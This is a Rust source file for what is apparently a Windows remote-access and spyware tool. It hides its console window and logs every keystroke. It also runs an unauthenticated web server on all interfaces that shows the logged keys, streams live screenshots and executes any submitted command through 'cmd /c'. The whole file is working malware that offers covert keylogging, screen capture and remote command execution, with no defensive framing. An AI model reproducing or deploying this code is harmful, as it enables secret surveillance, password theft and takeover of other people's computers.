#![windows_subsystem = "windows"]
use axum::{
    Form, Router,
    http::{HeaderMap, HeaderValue},
    response::{Html, IntoResponse},
    routing::{get, post},
};
use device_query::{DeviceEvents, DeviceEventsHandler};
use rdev::listen;
use serde::Deserialize;
use std::{
    env::args,
    io::Cursor,
    sync::{Arc, Mutex},
    time::Duration,
};
use tokio::{main, net::TcpListener, process::Command, spawn};
use xcap::{Monitor, image::ImageFormat};
#[derive(Deserialize)]
struct Frm {
    area: String,
}
#[main]
async fn main() {
    let mut arg = args();
    arg.next();
    let lock = Arc::new(Mutex::new(String::new()));
    let lock1 = Arc::clone(&lock);
    let lock2 = Arc::clone(&lock);
    let lck = Arc::new(Mutex::new(String::new()));
    let lck1 = Arc::clone(&lck);
    let lck2 = Arc::clone(&lck);
    let _key_listener = DeviceEventsHandler::new(Duration::ZERO)
        .unwrap()
        .on_key_down(move |key| *lock2.lock().unwrap() += &(key.to_string() + " "));
    spawn(async {
        let lckin = lck2;
        loop {
            let lckinin = lckin.clone();
            listen(move |e| {
                if let Some(name) = e.name {
                    *lckinin.lock().unwrap() += &name;
                }
            })
            .unwrap();
        }
    });
    axum::serve(
        TcpListener::bind(String::from("0.0.0.0:") +
            &arg.next().unwrap_or(String::from("1145"))).await.unwrap(),
        Router::new()
    .route("/", get(async move || {
        ({
            let mut head = HeaderMap::new();
            head.insert(
                "Cache-Control",
                HeaderValue::from_static("no-store, no-cache, must-revalidate, max-age=0"),
            );
            head.insert("Expires", HeaderValue::from_static("-1"));
            head.insert("Pragma", HeaderValue::from_static("no-cache"));
            head
        }, Html(
            String::from(
                r#"<!DOCTYPE html><html><body><form action="/cmd" method="post"><textarea name="area"></textarea><input type="submit" value="提交" /></form><a href="/clear">清空</a><pre style="white-space: pre-wrap;">"#,
            ) + lock1.lock().unwrap().as_str() + "<hr/>" + lck1.lock().unwrap().as_str()
                + r#"</pre><img src="screen.bmp"/><script>setInterval(()=>{document.querySelector("img").src="/screen.bmp?"+Date.now()},160);</script></body></html>"#,
        )).into_response()
    })) .route("/cmd", post(async |Form(Frm { mut area })| {
        area = String::from("cmd /c ") + &area;
        let parts: Vec<&str> = area.split_whitespace().collect();
        Command::new(parts[0]).args(&parts[1..]).spawn().unwrap();
        Html(
            r#"<!DOCTYPE html><html><body><script>window.location.href="/"</script></body></html>"#,
        )
    })) .route("/clear", get(async move || {
        lock.lock().unwrap().clear(); lck.lock().unwrap().clear();
        Html(
            r#"<!DOCTYPE html><html><body><script>window.location.href="/"</script></body></html>"#,
        )
    })) .route("/screen.bmp", get(async || {
        let mut buf = Cursor::new(Vec::new());
        Monitor::all().unwrap()[0].capture_image().unwrap()
            .write_to(&mut buf, ImageFormat::Bmp).unwrap();
        buf.into_inner()
    }))).await.unwrap();
}
